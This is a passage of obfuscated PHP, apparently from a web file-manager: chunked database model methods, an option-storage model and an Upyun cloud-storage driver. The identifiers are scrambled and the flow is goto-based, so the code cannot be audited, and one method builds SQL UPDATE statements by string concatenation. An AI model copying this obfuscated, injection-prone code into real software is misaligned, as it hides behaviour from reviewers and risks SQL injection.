$this->execute($c°ÊπîÈÂ∂); goto F∞Ω∞òÂæ¢; F∞Ω∞òÂæ¢: $f–≤“€úÍ∞ = 0; $c°ÊπîÈÂ∂ = $c§“Áà‘Ø√; $this->chunkEventCheck(count($f≥™ü™à¨Ì)); goto Fíö´÷èﬂ‹; Fíö´÷èﬂ‹: $f≥™ü™à¨Ì = array(); goto aéŸáê—˜Ω; aéŸáê—˜Ω: } } goto CÖ‰ΩªﬁŒ–; A∑Áôä≠Ñõ: $d‹π°‰»©√ = is_array($d‹π°‰»©√) ? $d‹π°‰»©√ : array(); $c°ÊπîÈÂ∂ = $D˘Ï«üèùË[66]; $f–≤“€úÍ∞ = 0; goto E–çåÆ«‹æ; fà√ﬂÊä€¶: $D˘Ï«üèùË =& $_SERVER[Æ¡î¢≠¯™]; $Bﬂ∑«çﬁ•Ω = $this->tablePrefix . $this->tableName; $C«˘›í∑ƒ— = self::SQL_WHERE_IN_CHUNK; goto A∑Áôä≠Ñõ; A«ﬁØÿ«˘¯: } public function saveAllEach($b‹ªÇæ°™Ñ) { $CÍ≠›≤‘©« =& $_SERVER[Æ¡î¢≠¯™]; $DÓ√¿ß∂®à = $this->tablePrefix . $this->tableName; foreach ($b‹ªÇæ°™Ñ as $búˆÀîœé) { if (!is_array($búˆÀîœé) || count($búˆÀîœé) != 4) { continue; } $fÑë¢Ñ·∂ø = $búˆÀîœé[0] . $CÍ≠›≤‘©«[367] . $búˆÀîœé[1] . $CÍ≠›≤‘©«[123]; $E“ÃÚêó° = $búˆÀîœé[2] . $CÍ≠›≤‘©«[367] . $búˆÀîœé[3] . $CÍ≠›≤‘©«[123]; $A˘ú§„≤·¢ = "\x75\160\144\x61\164\145\40{$DÓ√¿ß∂®à}\x20\x73\x65\164\40{$E“ÃÚêó°}\40\x77\150\x65\162\x65\x20{$fÑë¢Ñ·∂ø}\73"; $this->execute($A˘ú§„≤·¢); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e·Ì€Èî‹í = false, $CÍŒ∑Ù´Êê = false) { $this->_chunkEvent = $e·Ì€Èî‹í; $this->_chunkEventParam = $CÍŒ∑Ù´Êê; } private function chunkEventCheck($EÛî¬‡ˆü‡) { if (!$this->_chunkEvent) { return; } $f™©ŒÌíü™ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $f™©ŒÌíü™[$_SERVER[Æ¡î¢≠¯™][368]] = $EÛî¬‡ˆü‡; Hook::trigger($this->_chunkEvent, $f™©ŒÌíü™); } public function addAll($dŸâ–º‹“å, $EÙƒÇ∑¡ƒ≈ = array(), $eêë√˘©ó∫ = false) { goto F≥ﬂ∫∏ƒÈ‚; a„ë’⁄πè–: if (empty($dŸâ–º‹“å)) { $this->error = think_lang($a£ÌÂ¬å≠ã[265]); return !1; } $EÙƒÇ∑¡ƒ≈ = $this->_parseOptions($EÙƒÇ∑¡ƒ≈); foreach ($dŸâ–º‹“å as $dÏ∑‹àáÙ» => $eü¿ó·¯Ì∑) { $dŸâ–º‹“å[$dÏ∑‹àáÙ»] = $this->_facade($eü¿ó·¯Ì∑); $this->_beforeInsert($dŸâ–º‹“å[$dÏ∑‹àáÙ»], $EÙƒÇ∑¡ƒ≈); } goto aê—ªïﬁÜÍ; F≥ﬂ∫∏ƒÈ‚: $a£ÌÂ¬å≠ã =& $_SERVER[Æ¡î¢≠¯™]; ignore_timeout(); $C¿È»èîÚå = self::SQL_WHERE_IN_CHUNK; goto a„ë’⁄πè–; aê—ªïﬁÜÍ: if (method_exists($this->db, $a£ÌÂ¬å≠ã[266])) { for ($fˆÏŸ†ƒåÆ = 0; $fˆÏŸ†ƒåÆ < count($dŸâ–º‹“å); $fˆÏŸ†ƒåÆ += $C¿È»èîÚå) { $eÔÇ»ç“Ñµ = array_slice($dŸâ–º‹“å, $fˆÏŸ†ƒåÆ, $C¿È»èîÚå); if (!is_array($eÔÇ»ç“Ñµ) || count($eÔÇ»ç“Ñµ) == 0) { break; } $e©∆Â¿îñß = $this->db->insertAll($eÔÇ»ç“Ñµ, $EÙƒÇ∑¡ƒ≈, $eêë√˘©ó∫); $this->chunkEventCheck(count($eÔÇ»ç“Ñµ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($dŸâ–º‹“å as $dÏ∑‹àáÙ» => $eü¿ó·¯Ì∑) { $e©∆Â¿îñß = $this->db->insert($eü¿ó·¯Ì∑, $EÙƒÇ∑¡ƒ≈, $eêë√˘©ó∫); } $this->commit(); } if (!1 !== $e©∆Â¿îñß) { $DèﬂèáïËÑ = $this->getLastInsID(); if ($DèﬂèáïËÑ) { return $DèﬂèáïËÑ; } } return $e©∆Â¿îñß; goto FﬂÔÛ™È∂Í; FﬂÔÛ™È∂Í: } public function save($C°™Ù˘∞Ú¨ = '', $f“ÎÉ‚†—Á = array()) { goto c¶áΩÏ ÒÊ; CÜËïæ´ªÃ: $D´·ØÇ±¡ã = $this->findWhereField($C¶—ÌÖ∫Ωã); if (!$D´·ØÇ±¡ã) { return parent::save($C°™Ù˘∞Ú¨, $f“ÎÉ‚†—Á); } $Cª¥ÍŸêÇ÷ = 0; goto dÆ–È••Ò·; f´ë’ª“öØ: for ($eÉ…µùﬁÍ„ = 0; $eÉ…µùﬁÍ„ < $DÆñû≤…§å; $eÉ…µùﬁÍ„ += $b«∫Ù∆ÕÜë) { $a§¢ù‹†≈π = array_slice($D»Àßù”ÆÌ, $eÉ…µùﬁÍ„, $b«∫Ù∆ÕÜë); if (!is_array($a§¢ù‹†≈π) || count($a§¢ù‹†≈π) == 0) { break; } $C¶—ÌÖ∫Ωã[$bÏÜﬂõó¬õ[269]][$D´·ØÇ±¡ã][1] = $a§¢ù‹†≈π; $this->optionsValue($C¶—ÌÖ∫Ωã); $Cª¥ÍŸêÇ÷ += parent::save($C°™Ù˘∞Ú¨, $f“ÎÉ‚†—Á); $this->chunkEventCheck(count($a§¢ù‹†≈π)); } $this->chunkEventSet(); return $Cª¥ÍŸêÇ÷; goto cÑÇê«ºÏË; c¶áΩÏ ÒÊ: $bÏÜﬂõó¬õ =& $_SERVER[Æ¡î¢≠¯™]; $b«∫Ù∆ÕÜë = self::SQL_WHERE_IN_CHUNK; $C¶—ÌÖ∫Ωã = $this->optionsValue(); goto CÜËïæ´ªÃ; dÆ–È••Ò·: $D»Àßù”ÆÌ = $C¶—ÌÖ∫Ωã[$bÏÜﬂõó¬õ[269]][$D´·ØÇ±¡ã][1]; $D»Àßù”ÆÌ = is_array($D»Àßù”ÆÌ) ? $D»Àßù”ÆÌ : array(); $DÆñû≤…§å = count($D»Àßù”ÆÌ); goto f´ë’ª“öØ; cÑÇê«ºÏË: } public function add($FÒ†ºÍÍ‰è = '', $E÷ÙçÍøà† = array(), $Dªú¨∫éØ¿ = false) { if ($this->addTaskStatus && is_array($FÒ†ºÍÍ‰è)) { $this->addTaskData[] = $FÒ†ºÍÍ‰è; return; } return parent::add($FÒ†ºÍÍ‰è, $E÷ÙçÍøà†, $Dªú¨∫éØ¿); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Aõ‹”ÈäÇ≠ = array()) { goto A∆±ÀéÛ‰·; a≥ıæ©á∑÷: return $bØ˘Ö‘åµ≤; goto a‚æ‡Ï÷Àº; A∆±ÀéÛ‰·: $fÕ‚ŸÉáÂ≥ =& $_SERVER[Æ¡î¢≠¯™]; $AÔá¢ŒßÁ» = self::SQL_WHERE_IN_CHUNK; $FËã√Ô÷Ò¿ = $this->optionsValue(); goto BﬂÇîïÔëÖ; Cì‚¿÷‚Ωô: $EëÚ¶¡∑Õó = is_array($EëÚ¶¡∑Õó) ? $EëÚ¶¡∑Õó : array(); $bØ˘Ö‘åµ≤ = null; for ($Fá£Éöû¢œ = 0; $Fá£Éöû¢œ < count($EëÚ¶¡∑Õó); $Fá£Éöû¢œ += $AÔá¢ŒßÁ») { $dí¬≠¬ë˘… = array_slice($EëÚ¶¡∑Õó, $Fá£Éöû¢œ, $AÔá¢ŒßÁ»); if (!is_array($dí¬≠¬ë˘…) || count($dí¬≠¬ë˘…) == 0) { break; } $FËã√Ô÷Ò¿[$fÕ‚ŸÉáÂ≥[269]][$EëáÌ–◊ì][1] = $dí¬≠¬ë˘…; $this->optionsValue($FËã√Ô÷Ò¿); $C“¬Ñãá·« = parent::select($Aõ‹”ÈäÇ≠); if (!$C“¬Ñãá·«) { continue; } if (is_null($bØ˘Ö‘åµ≤)) { $bØ˘Ö‘åµ≤ = array(); } $bØ˘Ö‘åµ≤ = array_merge($bØ˘Ö‘åµ≤, $C“¬Ñãá·«); } goto a≥ıæ©á∑÷; BﬂÇîïÔëÖ: $EëáÌ–◊ì = $this->findWhereField($FËã√Ô÷Ò¿); if (!$EëáÌ–◊ì || isset($FËã√Ô÷Ò¿[$fÕ‚ŸÉáÂ≥[286]]) || isset($FËã√Ô÷Ò¿[$fÕ‚ŸÉáÂ≥[346]])) { return parent::select($Aõ‹”ÈäÇ≠); } $EëÚ¶¡∑Õó = $FËã√Ô÷Ò¿[$fÕ‚ŸÉáÂ≥[269]][$EëáÌ–◊ì][1]; goto Cì‚¿÷‚Ωô; a‚æ‡Ï÷Àº: } public function delete($DÆá…≤∞ÜÁ = array()) { goto A‡§à∫πÀÆ; fûªßÉﬂÙ¬: return $eØâ†ß©√ﬂ; goto eØ≤√ﬁÖóÏ; D°ı«ä¢…®: $eˆ»€‹†πá = $this->findWhereField($Bóóò‹°’õ); if (!$eˆ»€‹†πá) { return parent::delete($DÆá…≤∞ÜÁ); } $eØâ†ß©√ﬂ = 0; goto A·»†•‡ÈÑ; A‡§à∫πÀÆ: $aÁ¬ñ∂Ö„Ö =& $_SERVER[Æ¡î¢≠¯™]; $DµË‚ºü±ú = self::SQL_WHERE_IN_CHUNK; $Bóóò‹°’õ = $this->optionsValue(); goto D°ı«ä¢…®; A·»†•‡ÈÑ: $Aò»≤ºô…á = $Bóóò‹°’õ[$aÁ¬ñ∂Ö„Ö[269]][$eˆ»€‹†πá][1]; $Aò»≤ºô…á = is_array($Aò»≤ºô…á) ? $Aò»≤ºô…á : array(); for ($FêìäÊ÷è† = 0; $FêìäÊ÷è† < count($Aò»≤ºô…á); $FêìäÊ÷è† += $DµË‚ºü±ú) { $B®ÂÆâÙã = array_slice($Aò»≤ºô…á, $FêìäÊ÷è†, $DµË‚ºü±ú); if (!is_array($B®ÂÆâÙã) || count($B®ÂÆâÙã) == 0) { break; } $Bóóò‹°’õ[$aÁ¬ñ∂Ö„Ö[269]][$eˆ»€‹†πá][1] = $B®ÂÆâÙã; $this->optionsValue($Bóóò‹°’õ); $eØâ†ß©√ﬂ += parent::delete($DÆá…≤∞ÜÁ); } goto fûªßÉﬂÙ¬; eØ≤√ﬁÖóÏ: } private function findWhereField($A≠ù«™ÛÀÇ) { $C‰§›Óá“≥ =& $_SERVER[Æ¡î¢≠¯™]; $Aß√ŒÁ‘ … = self::SQL_WHERE_IN_CHUNK; if (!is_array($A≠ù«™ÛÀÇ) || !is_array($A≠ù«™ÛÀÇ[$C‰§›Óá“≥[269]])) { return !1; } foreach ($A≠ù«™ÛÀÇ[$C‰§›Óá“≥[269]] as $A‹„©ı™÷© => $dÑ˘Í«—Ÿº) { if (is_array($dÑ˘Í«—Ÿº) && isset($dÑ˘Í«—Ÿº[0]) && is_string($dÑ˘Í«—Ÿº[0]) && strtolower($dÑ˘Í«—Ÿº[0]) == $C‰§›Óá“≥[7] && is_array($dÑ˘Í«—Ÿº[1]) && count($dÑ˘Í«—Ÿº[1]) > $Aß√ŒÁ‘ …) { ignore_timeout(); return $A‹„©ı™÷©; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\117\x70\164\x69\157\x6e"; public $field = array(); public function listData($b‘òÛíå≤’ = false, $AÿÇ√¨ìﬂˆ = "\155\157\x64\151\146\x79\x54\x69\x6d\x65", $Aëÿÿ¡Ü‘ = false) { $EÖ„—µäÇÜ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$EÖ„—µäÇÜ) { return $b‘òÛíå≤’ ? null : array(); } if (!$b‘òÛíå≤’) { $EÖ„—µäÇÜ = array_filter(array_values($EÖ„—µäÇÜ)); return array_sort_by($EÖ„—µäÇÜ, $AÿÇ√¨ìﬂˆ, $Aëÿÿ¡Ü‘); } return $EÖ„—µäÇÜ[$_SERVER[Æ¡î¢≠¯™][369] . $b‘òÛíå≤’]; } public function insert($a‚≥£‚…¯ƒ) { goto B¶¯ÿÛ◊÷ı; CüóÖ–ôÉ—: $a‚≥£‚…¯ƒ[$bıöÇ∆›˘Ó[117]] = time(); Model($this->modelType)->set($bıöÇ∆›˘Ó[370], $b§ãø˘¡è◊, $this->optionType . $bıöÇ∆›˘Ó[371]); Model($this->modelType)->set($bıöÇ∆›˘Ó[369] . $b§ãø˘¡è◊, $a‚≥£‚…¯ƒ, $this->optionType); goto a‘Ω™«ö√; a‘Ω™«ö√: return $b§ãø˘¡è◊; goto aòçË≈œ©ö; c·áÙ¬πÿƒ: $b§ãø˘¡è◊ = $b§ãø˘¡è◊ ? $b§ãø˘¡è◊ : 0; $a‚≥£‚…¯ƒ[$bıöÇ∆›˘Ó[372]] = ++$b§ãø˘¡è◊; $a‚≥£‚…¯ƒ[$bıöÇ∆›˘Ó[194]] = time(); goto CüóÖ–ôÉ—; B¶¯ÿÛ◊÷ı: $bıöÇ∆›˘Ó =& $_SERVER[Æ¡î¢≠¯™]; $a‚≥£‚…¯ƒ = array_field_key($a‚≥£‚…¯ƒ, $this->field); $b§ãø˘¡è◊ = Model($this->modelType)->get($bıöÇ∆›˘Ó[370], $this->optionType . $bıöÇ∆›˘Ó[371]); goto c·áÙ¬πÿƒ; aòçË≈œ©ö: } public function update($aå◊∏ì‡ãﬂ, $B∫ÁÜ¡°ﬁ≠) { goto C¯ÎÀ®ÖÙñ; C¯ÎÀ®ÖÙñ: $EÒÉµï˜Ãë =& $_SERVER[Æ¡î¢≠¯™]; $B∫ÁÜ¡°ﬁ≠ = array_field_key($B∫ÁÜ¡°ﬁ≠, $this->field); $Fõï”ä•ì… = $this->listData($aå◊∏ì‡ãﬂ); goto DÑºâÜ«©Æ; a∏‘Î¯Ü∞—: return Model($this->modelType)->set($EÒÉµï˜Ãë[369] . $aå◊∏ì‡ãﬂ, $B∫ÁÜ¡°ﬁ≠, $this->optionType); goto bìä•´áêÇ; DÑºâÜ«©Æ: if (!$Fõï”ä•ì…) { return !1; } $B∫ÁÜ¡°ﬁ≠ = array_merge($Fõï”ä•ì…, $B∫ÁÜ¡°ﬁ≠); $B∫ÁÜ¡°ﬁ≠[$EÒÉµï˜Ãë[117]] = time(); goto a∏‘Î¯Ü∞—; bìä•´áêÇ: } public function remove($CÚ«≈ú∂œã) { return Model($this->modelType)->remove($_SERVER[Æ¡î¢≠¯™][369] . $CÚ«≈ú∂œã, $this->optionType); } public function clear() { $DÔªì≥àåÎ =& $_SERVER[Æ¡î¢≠¯™]; Model($this->modelType)->remove($DÔªì≥àåÎ[370], $this->optionType . $DÔªì≥àåÎ[371]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($AÀ·ªß´¡È, $Fæ»√ÖÂï…) { if (!$Fæ»√ÖÂï…) { return !1; } $FŸÏà‚° = $this->listData(); $FŸÏà‚° = array_to_keyvalue($FŸÏà‚°, $AÀ·ªß´¡È); return isset($FŸÏà‚°[$Fæ»√ÖÂï…]) ? $FŸÏà‚°[$Fæ»√ÖÂï…] : !1; } public function findByName($fﬁùΩíØ‡˜) { return $this->findByKey($_SERVER[Æ¡î¢≠¯™][28], $fﬁùΩíØ‡˜); } protected function resetData($f”ç≈Æ‡’‚) { $B‹Ö“ë·ø∞ =& $_SERVER[Æ¡î¢≠¯™]; $f”ç≈Æ‡’‚ = is_array($f”ç≈Æ‡’‚) ? $f”ç≈Æ‡’‚ : array(); $C…ÜÉ«âùö = array(); for ($Añ—äíÀ≥Ç = 0; $Añ—äíÀ≥Ç < count($f”ç≈Æ‡’‚); $Añ—äíÀ≥Ç++) { $C…ÜÉ«âùö[$B‹Ö“ë·ø∞[369] . $f”ç≈Æ‡’‚[$Añ—äíÀ≥Ç][$B‹Ö“ë·ø∞[372]]] = $f”ç≈Æ‡’‚[$Añ—äíÀ≥Ç]; } return Model($this->modelType)->set($C…ÜÉ«âùö, !1, $this->optionType); } private function getAutoName($CﬂÜßÈÏéë) { $AÏ∑®∫◊≥ñ = array_to_keyvalue($this->listData(), $_SERVER[Æ¡î¢≠¯™][28]); if (!$AÏ∑®∫◊≥ñ || !isset($AÏ∑®∫◊≥ñ[$CﬂÜßÈÏéë])) { return $CﬂÜßÈÏéë; } for ($fÀØ’∏Ì∑ƒ = 1; $fÀØ’∏Ì∑ƒ < count($AÏ∑®∫◊≥ñ); $fÀØ’∏Ì∑ƒ++) { $D§àõï´·Ó = $CﬂÜßÈÏéë . "\x28{$fÀØ’∏Ì∑ƒ}\x29"; if (!isset($AÏ∑®∫◊≥ñ[$D§àõï´·Ó])) { return $D§àõï´·Ó; } } return $D§àõï´·Ó; } } goto Aó¢ñº∂ÁÒ; B¥¨˜÷∆ä : register_shutdown_function($_SERVER[âñö‚‚Ñ][36]); set_error_handler($_SERVER[âñö‚‚Ñ][49], $aÍôΩ Èã); if (function_exists($_SERVER[âñö‚‚Ñ][50])) { set_exception_handler($_SERVER[âñö‚‚Ñ][51]); } goto D¶ññ≥ûÿ“; eÕ‹±›æ¶–: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\x3a\x2f\x2f\x76\60\x2e\x61\x70\151\56\165\160\x79\165\x6e\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($a‡±∏°¯Ôé) { parent::__construct(); $this->_init($a‡±∏°¯Ôé); } public function _init($b Õ∂è ‹Æ) { foreach ($b Õ∂è ‹Æ as $D…Çé≥üÏñ => $f∏äƒô‡¥í) { if (isset($this->{$D…Çé≥üÏñ})) { $this->{$D…Çé≥üÏñ} = $f∏äƒô‡¥í; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Æ¡î¢≠¯™][1219], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($FÑÿ∑”´º’, $CõÍµÎ¶Ò® = "\107\105\124") { $DéãƒÒá—“ =& $_SERVER[Æ¡î¢≠¯™]; $dÇ«ÂìÎˆÈ = gmdate($DéãƒÒá—“[1183]); $d©À«·…ï≤ = base64_encode(hash_hmac($DéãƒÒá—“[1220], "{$CõÍµÎ¶Ò®}\46{$FÑÿ∑”´º’}\x26{$dÇ«ÂìÎˆÈ}", md5("{$this->userpass}"), !0)); $d⁄ﬂø’ë§¶ = array("\101\x75\x74\x68\x6f\x72\x69\x7a\x61\164\x69\x6f\156\x3a\125\x50\131\x55\x4e\x20{$this->username}\72{$d©À«·…ï≤}", "\104\141\x74\x65\x3a{$dÇ«ÂìÎˆÈ}"); return $d⁄ﬂø’ë§¶; } public function ussRequest($E≈Òøá¢ô€, $CËêπüöÎÇ = "\107\105\124", $F≤ñ–÷èÚæ = false, $aáçäÎÛ·ƒ = false, $DÑá™Õ’◊¬ = false) { goto aºÆ∫€Èõà; aºÆ∫€Èõà: $C‹‘ÒªåøÈ =& $_SERVER[Æ¡î¢≠¯™]; $E≈Òøá¢ô€ = trim($E≈Òøá¢ô€, $C‹‘ÒªåøÈ[8]); $D÷˘å¶îèﬁ = "\x2f{$this->bucket}\57{$E≈Òøá¢ô€}"; goto d≤Ÿå≤ò¬‡; aöÿ¿Öé°≥: if (!$Bëå±‡„À¢) { return array($C‹‘ÒªåøÈ[1018] => !1, $C‹‘ÒªåøÈ[1020] => $C‹‘ÒªåøÈ[1221]); } if (strtolower($CËêπüöÎÇ) == $C‹‘ÒªåøÈ[191] || in_array($Bëå±‡„À¢[$C‹‘ÒªåøÈ[1018]], array($C‹‘ÒªåøÈ[1079], $C‹‘ÒªåøÈ[1222]))) { $F≤ñ–÷èÚæ = $Bëå±‡„À¢[$C‹‘ÒªåøÈ[1223]]; } else { $F≤ñ–÷èÚæ = json_decode($Bëå±‡„À¢[$C‹‘ÒªåøÈ[1020]], !0); if (!$F≤ñ–÷èÚæ) { $F≤ñ–÷èÚæ = $Bëå±‡„À¢[$C‹‘ÒªåøÈ[1020]]; } else { if (!$Bëå±‡„À¢[$C‹‘ÒªåøÈ[681]] && isset($F≤ñ–÷èÚæ[$C‹‘ÒªåøÈ[1224]])) { $F≤ñ–÷èÚæ = $F≤ñ–÷èÚæ[$C‹‘ÒªåøÈ[1224]]; } } } return array($C‹‘ÒªåøÈ[1018] => $Bëå±‡„À¢[$C‹‘ÒªåøÈ[681]], $C‹‘ÒªåøÈ[1020] => $F≤ñ–÷èÚæ); goto dËÔπ†ãœ’; d≤Ÿå≤ò¬‡: $eÏõË‹€ä™ = $this->ussHeaders($D÷˘å¶îèﬁ, $CËêπüöÎÇ); if ($aáçäÎÛ·ƒ) { $eÏõË‹€ä™ = array_merge($eÏõË‹€ä™, $aáçäÎÛ·ƒ); } $Bëå±‡„À¢ = url_request($this->endpoint . $D÷˘å¶îèﬁ, $CËêπüöÎÇ, $F≤ñ–÷èÚæ, $eÏõË‹€ä™, $DÑá™Õ’◊¬); goto aöÿ¿Öé°≥; dËÔπ†ãœ’: } public function mkfile($B≈‘õ†ñá’, $DıæÕ«ôÈí = '', $CßÖÙÔëçÖ = REPEAT_RENAME) { if ($this->setContent($B≈‘õ†ñá’, $DıæÕ«ôÈí)) { return $this->getPathOuter($B≈‘õ†ñá’); } return !1; } public function mkdir($d±´èÎâ‚·, $DÊ¶Ü•≥ıÑ = REPEAT_SKIP) { $BÆ€é”ôë =& $_SERVER[Æ¡î¢≠¯™]; $cﬁã¡ëÍ∞¶ = trim($d±´èÎâ‚·, $BÆ€é”ôë[8]); if ($this->_isFolder($cﬁã¡ëÍ∞¶)) { return $this->getPathOuter($cﬁã¡ëÍ∞¶); } $c„∆ä∫ØÏ° = array($BÆ€é”ôë[1225]); $F˜∏Û¨ÑÔ = $this->ussRequest($cﬁã¡ëÍ∞¶, $BÆ€é”ôë[219], !1, $c„∆ä∫ØÏ°); return $F˜∏Û¨ÑÔ[$BÆ€é”ôë[1018]] ? $this->getPathOuter($cﬁã¡ëÍ∞¶) : !1; } public function copyFile($aÙ´Òö‘ŒÆ, $BÓ◊»…¿ê…) { $F∂ûâ√»•Õ =& $_SERVER[Æ¡î¢≠¯™]; $AœØÙ´±Ω≠ = array($F∂ûâ√»•Õ[1226] . "\57{$this->bucket}\x2f{$aÙ´Òö‘ŒÆ}", $F∂ûâ√»•Õ[1227]); $eª√¥ªÎΩµ = $this->ussRequest($BÓ◊»…¿ê…, $F∂ûâ√»•Õ[221], !1, $AœØÙ´±Ω≠); return $eª√¥ªÎΩµ[$F∂ûâ√»•Õ[1018]] ? !0 : !1; } public function moveFile($bÜÎ“¯¬Úÿ, $C›Í ≈⁄π—) { $BçÖÑ¡‚òë =& $_SERVER[Æ¡î¢≠¯™]; $DäåèäÌÖ = array($BçÖÑ¡‚òë[1228] . "\x2f{$this->bucket}\x2f{$bÜÎ“¯¬Úÿ}", $BçÖÑ¡‚òë[1227]); $Däâ∞⁄êûâ = $this->ussRequest($C›Í ≈⁄π—, $BçÖÑ¡‚òë[221], !1, $DäåèäÌÖ); return $Däâ∞⁄êûâ[$BçÖÑ¡‚òë[1018]] ? !0 : !1; } public function delFile($e”±Ë≠ß–è) { $eÔñÈ—Ç¨‰ =& $_SERVER[Æ¡î¢≠¯™]; $f≈‹öõÊéÎ = $this->ussRequest($e”±Ë≠ß–è, $eÔñÈ—Ç¨‰[1229]); return $f≈‹öõÊéÎ[$eÔñÈ—Ç¨‰[1018]] ? !0 : !1; } public function delFolder($F›ñÁñÙÙû) { $BçÛì°»ÌÌ =& $_SERVER[Æ¡î¢≠¯™]; $cÕ∂Ü€¿ØŒ = $this->listAll($F›ñÁñÙÙû); krsort($cÕ∂Ü€¿ØŒ); foreach ($cÕ∂Ü€¿ØŒ as $b’Ñ°Ë»˜É) { $this->ussRequest($b’Ñ°Ë»˜É[$BçÛì°»ÌÌ[85]], $BçÛì°»ÌÌ[1229]); } return $this->ussRequest($F›ñÁñÙÙû, $BçÛì°»ÌÌ[1229]); } public function rename($Eˆ•ÈÉΩ•â, $f§∂çÖ™Û…) { if ($this->isFile($Eˆ•ÈÉΩ•â)) { $f§∂çÖ™Û… = get_path_father($Eˆ•ÈÉΩ•â) . $f§∂çÖ™Û…; return $this->moveFile($Eˆ•ÈÉΩ•â, $f§∂çÖ™Û…); } return $this->renameObject($Eˆ•ÈÉΩ•â, $f§∂çÖ™Û…); } public function fileInfo($e°≠°∆æ£ú, $a◊ìÿÒ§·è = false, $cìçﬂ¿äé“ = array()) { $Fâ«Ìí€Œù =& $_SERVER[Æ¡î¢≠¯™]; if ($a◊ìÿÒ§·è) { return array($Fâ«Ìí€Œù[28] => $this->pathThis($e°≠°∆æ£ú), $Fâ«Ìí€Œù[85] => $this->getPathOuter($Fâ«Ìí€Œù[8] . $e°≠°∆æ£ú), $Fâ«Ìí€Œù[29] => $Fâ«Ìí€Œù[174], $Fâ«Ìí€Œù[87] => isset($cìçﬂ¿äé“[$Fâ«Ìí€Œù[331]]) ? $cìçﬂ¿äé“[$Fâ«Ìí€Œù[331]] : 0, $Fâ«Ìí€Œù[167] => $this->ext($e°≠°∆æ£ú)); } $a°û‚”ÁÚ» = array($Fâ«Ìí€Œù[28] => $this->pathThis($e°≠°∆æ£ú), $Fâ«Ìí€Œù[85] => $this->getPathOuter($Fâ«Ìí€Œù[8] . $e°≠°∆æ£ú), $Fâ«Ìí€Œù[29] => $Fâ«Ìí€Œù[174], $Fâ«Ìí€Œù[194] => 0, $Fâ«Ìí€Œù[117] => isset($C÷ÿï¯¬¨ﬂ[$Fâ«Ìí€Œù[1230]]) ? $C÷ÿï¯¬¨ﬂ[$Fâ«Ìí€Œù[1230]] : 0, $Fâ«Ìí€Œù[87] => isset($cìçﬂ¿äé“[$Fâ«Ìí€Œù[331]]) ? $cìçﬂ¿äé“[$Fâ«Ìí€Œù[331]] : 0, $Fâ«Ìí€Œù[167] => $this->ext($e°≠°∆æ£ú), $Fâ«Ìí€Œù[195] => !0, $Fâ«Ìí€Œù[196] => !0); if (empty($cìçﬂ¿äé“)) { $cìçﬂ¿äé“ = $this->objectMeta($e°≠°∆æ£ú); if (!$cìçﬂ¿äé“) { return $a°û‚”ÁÚ»; } $a°û‚”ÁÚ»[$Fâ«Ìí€Œù[194]] = $cìçﬂ¿äé“[$Fâ«Ìí€Œù[1231]]; $a°û‚”ÁÚ»[$Fâ«Ìí€Œù[117]] = $cìçﬂ¿äé“[$Fâ«Ìí€Œù[1232]]; $a°û‚”ÁÚ»[$Fâ«Ìí€Œù[87]] = $cìçﬂ¿äé“[$Fâ«Ìí€Œù[87]]; } return $a°û‚”ÁÚ»; } public function folderInfo($fœ•É’Ó—‰, $d‘⁄‹‘‹ë = false) { $eë©¯‡æµ’ =& $_SERVER[Æ¡î¢≠¯™]; if ($d‘⁄‹‘‹ë) { return array($eë©¯‡æµ’[28] => $this->pathThis($fœ•É’Ó—‰), $eë©¯‡æµ’[85] => $this->getPathOuter($eë©¯‡æµ’[8] . $fœ•É’Ó—‰), $eë©¯‡æµ’[29] => $eë©¯‡æµ’[86]); } $EíòÖâ…ä„ = array($eë©¯‡æµ’[28] => $this->pathThis($fœ•É’Ó—‰), $eë©¯‡æµ’[85] => $this->getPathOuter($eë©¯‡æµ’[8] . $fœ•É’Ó—‰), $eë©¯‡æµ’[29] => $eë©¯‡æµ’[86], $eë©¯‡æµ’[194] => 0, $eë©¯‡æµ’[117] => isset($B»ò‚ã˘‘˜[$eë©¯‡æµ’[1230]]) ? $B»ò‚ã˘‘˜[$eë©¯‡æµ’[1230]] : 0, $eë©¯‡æµ’[1140] => !0, $eë©¯‡æµ’[1141] => !0); if (empty($Bœèè˘“ıö)) { $Bœèè˘“ıö = $this->objectMeta($fœ•É’Ó—‰); if (!$Bœèè˘“ıö) { return $EíòÖâ…ä„; } $EíòÖâ…ä„[$eë©¯‡æµ’[194]] = $Bœèè˘“ıö[$eë©¯‡æµ’[1231]]; $EíòÖâ…ä„[$eë©¯‡æµ’[117]] = $Bœèè˘“ıö[$eë©¯‡æµ’[1232]]; } return $EíòÖâ…ä„; } private function fileList($eΩâΩØÇå≠, $fÜ«·ú¨ÑÒ = 0, $B“Õﬂ§Ö£™ = 1000) { $A‹∞›ñêä =& $_SERVER[Æ¡î¢≠¯™]; $aé‚ô∫à◊Ê = array($A‹∞›ñêä[1233], $A‹∞›ñêä[1234] . $B“Õﬂ§Ö£™); if ($fÜ«·ú¨ÑÒ) { $aé‚ô∫à◊Ê[] = $A‹∞›ñêä[1235] . $fÜ«·ú¨ÑÒ; } $DÈáë›„¨ü = $this->ussRequest($eΩâΩØÇå≠, $A‹∞›ñêä[223], !1, $aé‚ô∫à◊Ê); return !$DÈáë›„¨ü[$A‹∞›ñêä[1018]] ? !1 : $DÈáë›„¨ü[$A‹∞›ñêä[1020]]; } public function listPath($còâˆﬂØåì, $d∞Ç°ı¨–  = false) { goto a®®ˆâÎ§Ë; c¢˜Ìø≥Çﬁ: $EîÍ´™‘î∫ = 